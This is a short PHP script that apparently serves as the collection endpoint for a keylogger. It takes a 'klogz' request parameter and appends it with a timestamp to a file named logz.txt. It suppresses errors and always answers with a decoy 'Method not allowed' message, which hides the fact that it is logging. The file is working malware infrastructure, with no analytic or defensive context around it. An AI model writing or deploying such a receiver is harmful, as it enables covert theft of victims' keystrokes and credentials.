<?php
error_reporting(0);
$log = $_REQUEST['klogz'];
if($log == null or $log == ''){
	echo"<h1>Method not allowed</h1>";
}else{
	echo "<h2>Method not allowed</h2>";
	$file = fopen('logz.txt','a');
	$data = "===================[ ".date("g:i A")." ]==================="."\r\n".$log."\r\n";
	fwrite($file, $data);
	fclose($file);
}
?>
